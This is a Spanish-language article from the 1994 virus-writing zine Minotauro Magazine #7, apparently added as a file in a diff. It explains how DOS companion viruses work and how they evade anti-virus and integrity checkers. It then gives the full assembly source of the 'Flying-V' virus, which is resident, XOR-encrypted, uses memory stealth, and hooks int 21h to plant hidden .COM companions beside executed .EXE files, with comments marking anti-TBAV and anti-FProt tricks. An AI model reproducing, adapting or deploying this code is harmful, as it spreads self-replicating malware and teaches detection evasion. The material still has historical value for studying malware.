@@ -1,0 +1,377 @@
+Minotauro Magazine #7:
+			        Virus Companion
+				   Por WMA
+
+	Bueno, en este art¡culo vamos a discutir una clase de virus llamados 
+virus companion. Esta clase de virus existe gracias a una cualidad del DOS, 
+que es que si existen dos archivos con igual nombre pero uno con extensi¢n .COM
+y otro con extensi¢n .EXE el archivo .COM ser  ejecutado primero.
+
+Esta clase de virus gralmente. es no residente, y lo que hace es buscar    
+por archivos .EXE y crear una copia del virus pero con el nombre del .EXE  
+y oculto (atributo hidden); as¡ el usuario al ejecutar el .EXE en realidad 
+estar  ejecutando el virus, el cual luego de hacer sus cosas ejecutar  al  
+archivo .EXE correspondiente (con la funci¢n 4B00h, int 21h).              
+                                                                           
+Como ver n el concepto es muy sencillo, cualquiera puede hacer esta clase  
+de virus, porq' en realidad no es ni un virus propiamente dicho, por esta  
+raz¢n hasta hay peleas por la nomenclatura con las que se lo nombra.. ;)   
+                                                                           
+Lo bueno de esta clase de virii, es que pueden infectar o acompa¤ar a un   
+anti-virus, cosa q' los virus comunes no pueden, ya que los virus companion
+no tocan al host, y el programa anti-virus no se entera de la presencia de 
+su compa¤erito ;), mientras q' un virus comun tendr¡a que modificar al     
+archivo del anti-virus y este al auto-chequearse al ser ejecutado dar¡a    
+cuenta de la infecci¢n.                                                    
+                                                                           
+Debido a lo anteriormente citado tambien son inmunes a los chequeadores    
+de integridad, ya que son un file mas.                                     
+                                                                           
+Por la misma raz¢n precinden de tecnicas de stealth de directorio.         
+                                                                           
+Tambien al no necesitar delta offsets ni nada por el estilo, ya q' el      
+virus se copia completo a otro archivo, empezando en el mismo offset se    
+esquiban algunos flags que hacen saltar a los anti-virus.                  
+                                                                           
+Combinar un virus companion con uno parasitario ser¡a una buena idea.      
+                                                                           
+Lo b sico que hay que saber para crear esta clase de 'virus' es saber lo q'
+necesita la funci¢n 4b00h de la int 21h para funcionar correctamente y unas
+cositas del PSP:                                                           
+                                                                           
+La funcion para ejecutar un file requiere de estos parametros...           
+                                                                           
+            AX = 4B00h                                                     
+         DS:DX = Nombre del file a ejecutar (ASCIIZ)                       
+         ES:BX = Bloque de parametros                                      
+                                                                           
+La funci¢n 4Bh tambien permite cargar un archivo sin ejecutarlo etc. por   
+medio de diferentes valores en AL (4B03h, 4B01h) pero eso no entra en la   
+idea de este art¡culo.                                                     
+                                                                           
+Veamos, en DS:DX va el nombre del file a ejecutar, que no tiene ning£n mis-
+-terio, y mirando el virus ejemplo que les dejo se dar n cuenta. Lo £nico  
+que cabe remarcar, es que como el virus ejemplo que les dejamos es residen-
+-te el buffer para guardar el filename no es de 13 bytes (filename+0), sino
+de 128 bytes(127 del file+0). Esto es as¡ porque al ejecutarse en file el  
+DOS le pasa a la funci¢n 4B00h el Full Path Name (x ej: C:\DOS\DEBUG.EXE)  
+y entonces si se esta ejecutando un file que est  en el path, y nosotros   
+solo consideramos el nombre del file en s¡, sin el path, al crear el .COM  
+companion, lo crearemos en el path actual err¢neamente y no en donde       
+corresponde. Los 127 bytes es porque la linea de comandos del DOS tiene    
+como m ximo ese valor.                                                     
+                                                                           
+Luego ES:BX apunta a una tabla que debe tener la siguiente forma:          
+                                                                           
+                dw xxx (segmento de entorno (enviroment)                   
+                dw 80h (offset del command line)                           
+                dw xxx (segmento)                                          
+                dw 5CH (FCB n£mero 1)                                      
+                dw xxx (segmento)                                          
+                dw 6Ch (FCB n£mero 2)                                      
+                dw xxx (segmento)                                          
+                                                                           
+los valores marcados con 'xxx' son los que tendremos que establecer        
+nosotros, en nuestro virus, lo demas son fijos y los pondremos al crear    
+esta estructura que tenemos que agregar en nuestro virus.                  
+                                                                           
+El primer 'xxx' es el ENVIROMENT SEGMENT, o segmento de entorno, este es el
+segmento en el que estan ubicados todos los 'SET' ;) que ponen uds. como x 
+ej. SET TZ=BUE3, ademas del nombre del file que esta siendo ejecutado, o   
+PARENT, ademas de otras cosas que son indocumentadas y no las se ;).       
+                                                                           
+Para obtener este valor simplemente tenemos que leerlo del offset 2Ch del  
+PSP, como nuestro virus es un COM el segmento del PSP es el de CS=DS=ES=SS 
+asi que simplemente:                                                       
+                                                                           
+                    mov ax,word ptr cs:[2Ch]      ; en AX el seg de entorno
+                                                                           
+y luego ponemos el valor de AX en el lugar adecuado de nuestra tabla.      
+                                                                           
+Luego viene el offset:segmento de la linea de comandos, que como todos     
+saben (saben?) esta en el offset 80h del PSP, lo unico que tenemos que     
+hacer es poner el segmento del PSP, de nuevo, como estamos en un COM le pa-
+-samos el valor de CS.                                                     
+                                                                           
+Por si no lo saben la linea de comandos son todos esos switches tipo /NOMEM
+etc. que le ponen a un programa al ejecutarlo. Se hace esto porque el      
+usuario al querer ejecutar su EXE estar  ejecutando nuestro virus .COM y si
+el programa requiere de parametros, los perder¡amos y el programa no fun-  
+-cionar¡a como debe, pero asi al ejecutarse el virus el cmdline queda en   
+en el offset 80h, llenamos con estos datos la tabla y al ejecutar el EXE le
+llegar n los switches correctamente.                                       
+                                                                           
+Por £ltimo, porque se me est  haciendo muy largo, la funci¢n 4B00h necesita
+2 FCB's, estos dos FCB's estan en los offsets 5Ch y 6Ch del PSP, lo £nico  
+que tiene que hacer el virus es poner los segmentos del PSP, o sea CS y    
+listo!.                                                                    
+                                                                           
+Agg, termin‚!,. si! ;), es medio tedioso todo esto, pero al fin, una vez   
+hecho todo esto tienen que liberar la memoria que no usan para que el file 
+a ejecutarse tenga lugar en donde hacerlo y punto, asi:                    
+                                                                           
+                   mov ah,4ah         ; modifico bloque de memoria alocado 
+                   mov bx,paraf       ; paragrafos que ocupa el virus      
+                   int 21h            ; (1 paragrafo son 16 bytes)         
+                                                                           
+Listo!, ahora ejecutan la funcion 4B00h como se debe, y se acab¢.          
+Lo £ltimo a tener es cuenta es que la funci¢n 4b00h, nos devuelve el con-  
+-trol a nosotros despu‚s de ejecutar el file, si es que este termina con   
+la funci¢n 4Ch de la int 21h (cosa que la mayor¡a de los programas hacen , 
+mas si son .EXE's :)), asi que luego de la ejecuci¢n del HOST conviene     
+poner un RET para terminar el virus sin errores.                           
+                                                                           
+En este art¡culo les dejo el source del virus Flying-V, q' es un virus     
+residente, encriptado, y por supuesto companion. ;).                       
+                                                                           
+Realmente el virus es MUY sencillo, asi q' creo q' la explicaci¢n anterior 
+alcanza y sobra para entenderlo, ademas el source est  correctamente       
+comentado.                                                                 
+                                                                           
+El virus esta hecho para el A86, asi q' ensamblenlo con este. ;)           
+                                                                           
+;-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-
+; Virus Flying-V por WM’ [DAN]               (c) 1994, Rep£blica Argentina
+;-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-
+
+;/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/
+;                 (c) Digital Anarchy Viral development
+;          Especialmente hecho para MinoTauro Magazine Issue #5 <- jajaja 5=7
+;\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\
+
+; þ Tama¤o: 633 bytes
+; þ Residente
+; þ Hookea int 21h (infecta al ejecutarse)
+; þ Virus Companion  (a .EXE's ;))
+; þ Encriptado
+; þ Stealth de Memoria
+
+; Los .COM creados tienen atributo Hidden y Read Only, as¡ si un archivo
+; ya tiene su compa¤ero .COM con un simple JC me doy cuenta y no pierdo
+; tiempo en crear nuevamente el .COM
+
+
+ID   equ  0ffeeh                                ; ID del virus en memoria
+
+
+flyingv:
+              cmp b[key],0                      ; si es la primera ejecu-
+              je crypted                        ; ci¢n no desencripto nada.
+              jmp skip
+
+key           db    0                           ; key de encripci¢n.
+
+skip:
+              mov al,key                        ; Key de encripci¢n.
+              lea bx,crypted                    ; Codigo a desencriptar.
+              mov dx,cryp_size                  ; Longitud del codigo a
+              xchg cx,dx                        ; desencriptar. Anti-Fprot
+
+decrypt:      xor cs:[bx],al                    ; desencripto.
+              inc bx                            ; paso al proximo byte.
+              loop decrypt
+crypted:
+              mov cx,ID                         ; Me fijo si estoy residen.
+              mov ax,cx                         ; Anti-tbav, flag U
+              int 21h
+              cmp bx,ID                         ; ya estoy en memoria,
+              je exec_exe                       ; ejecutamos el .EXE
+
+              mov ax,3521h                      ; pedimos vector int 21h
+              int 21h
+
+              mov word ptr cs:old21,bx          ; guardamos el vector
+              mov word ptr cs:old21+2,es
+
+              push cs
+              pop es
+
+              mov di,es                         ; stealth de memoria
+              dec di                            ; no me pidan q'
+              mov es,di                         ; lo comento de nuevo
+              mov bx,es:[3h]                    ; por favor.. ;)
+              sub bx,virpara1
+
+              inc di
+              mov es,di
+
+              mov ah,4ah
+              int 21h
+
+              mov bx,virpara
+              mov ah,48h
+              int 21h
+
+              dec ax
+              mov es,ax
+
+              mov byte ptr es:[1h],8
+
+              sub ax,0fh                        ; Copiamos el virus
+              mov es,ax                         ; a memoria.
+              mov si,100h
+              mov di,si
+              mov cx,virlen
+              rep movsb
+
+              push es
+              pop ds
+
+              mov ax,2421h                      ; instalamos nuestro
+              inc ah                            ; handler int 21h
+              lea dx,Newi21                     ; anti-tbav, flag M
+              int 21h
+
+exec_exe:
+              push cs,cs
+              pop ds,es
+
+              mov ax,cs:w[2Ch]                  ; guardo el segmento
+              mov cs:[Seg_del_PSP],ax           ; del PSP
+
+              mov cs:[Seg_CmdLine],cs           ; guardo segmentos
+              mov cs:[Seg_FCB1],cs              ; de los demas
+              mov cs:[Seg_FCB2],cs              ; pointers.
+
+              mov ah,4ah                        ; liberamos memoria
+              mov bx,virpara+1                  ; no usada.
+              int 21h
+
+              mov ax,4b00h                      ; ejecutamos el file.
+              mov dx,offset exe_name            ; file a ejecutar
+              mov bx,offset Seg_del_PSP         ; Bloque de Parametros
+              int 21h                           ; Listo!
+
+              ret
+
+
+;-- Data ------------------------------------------------------------------
+
+Seg_del_PSP  dw 0                               ; segmento del PSP
+
+Command_line dw 80h                             ; offset del CmdLine (Default)
+Seg_CmdLine  dw 0                               ; segmento
+
+_File1       dw 005Ch                           ; offset del FCB #1 (Default)
+Seg_FCB1     dw 0                               ; segmento
+
+_File2       dw 006Ch                           ; offset del FCB #2 (Default)
+Seg_FCB2     dw 0                               ; segmento
+
+Exe_name    db 'EXE     .EXE',0,114 dup (0h)    ; file a ejecutar
+open_name   db 'EXE     .COM',0,114 dup (0h)    ; buffer
+
+virname     db 'Flying-V áy WM’ [DAN]'          ; yo ;D
+
+;--------------------------------------------------------------------------
+
+;-- Handler int 21h -------------------------------------------------------
+
+Newi21:
+               cmp ax,ID                        ; verificaci¢n de
+               jne try                          ; residencia.
+               mov bx,ID
+               iret
+
+try:           cmp ax,4b00h                     ; vamos a crear un
+               je kick_ass                      ; compa¤ero.. ;)
+
+               jump: db 0eah                    ; Saltamos a la int 21h
+               old21 dd ?
+
+g2:            jmp done
+
+kick_ass:      push ax,bx,cx,dx,si,di,ds,es     ; guardamos registros
+
+               mov si,dx                        ; encontramos la
+search:        lodsb                            ; extensi¢n del file.
+               cmp al,0
+               je g2
+               cmp al,'.'
+               jne search
+
+               cmp word ptr ds:[si],'XE'        ; verificamos si es un
+               jne done                         ; .EXE, si no es nos
+               cmp byte ptr ds:[si+2],'E'       ; vamos.
+               jne done
+
+               push cs
+               pop es
+
+               xor cx,cx                        ; copiamos el nombre
+               lea di,exe_name                  ; del file a nuestro
+               mov si,dx                        ; buffer para despues
+save_name:     lodsb                            ; ejecutarlo.
+               cmp al,0
+               je mute_2_com
+               stosb
+               inc cx
+               jmp save_name
+
+mute_2_com:    stosb                            ; lo copiamos tambien
+               inc cx                           ; al segundo buffer para
+               lea di,open_name                 ; crear el .COM con
+               mov si,dx                        ; el mismo nombre.
+               rep movsb
+
+               push cs                          ; buscamos la extensi¢n del
+               pop ds                           ; file para cambiarsela
+               lea si,open_name                 ; a .COM y crear el .COM
+find_ext:      lodsb
+               cmp al,'.'
+               jne find_ext
+
+               mov word ptr ds:[si],'OC'        ; le ponemos la
+               mov byte ptr ds:[si+2],'M'       ; extension .COM
+
+fin:
+               mov ah,3Ch                       ; creamos el
+               mov cx,23h                       ; .COM
+               lea dx,open_name
+               int 21h                          ; si ya existe el .COM
+               jc done
+
+               xchg bx,ax                       ; handle en bx
+
+               mov ax,8d00h                     ; copiamos el
+               mov es,ax                        ; virus a una
+               mov di,100h                      ; zona no usada de
+               mov si,di                        ; memoria para
+               mov cx,virlen                    ; encriptarlo.
+               rep movsb
+
+again:         in al,40h                        ; tomamos un valor
+               cmp al,0                         ; aleatorio. si es 0
+               je again                         ; buscamos otro.
+
+               mov es:key,al                    ; encriptamos la
+               lea di,crypted                   ; parte del virus
+               mov cx,cryp_size                 ; q' hay q' encriptar
+crypt:         xor es:[di],al                   ; en el buffer en
+               inc di                           ; memoria
+               loop crypt
+
+               push es
+               pop ds
+
+               lea dx,flyingv                   ; escribimos el virus
+               mov cx,virlen                    ; encriptado.
+               mov ah,3fh                       ; anti-tbav, flag F
+               inc ah
+               int 21h
+
+               mov ah,3eh                       ; cerramos el file
+               int 21h
+
+done:
+
+               pop es,ds,di,si,dx,cx,bx,ax      ; restauramos registros
+               jmp jump                         ; saltamos a la int 21h
+
+cryp_size equ $ - offset crypted
+virlen    equ $ - offset flyingv
+virpara   equ (virlen+15)/16
+virpara1  equ virpara+1
+
+Que lo disfruten! ;).                                                      
+                                                       bye!.. WM’ [DAN]    
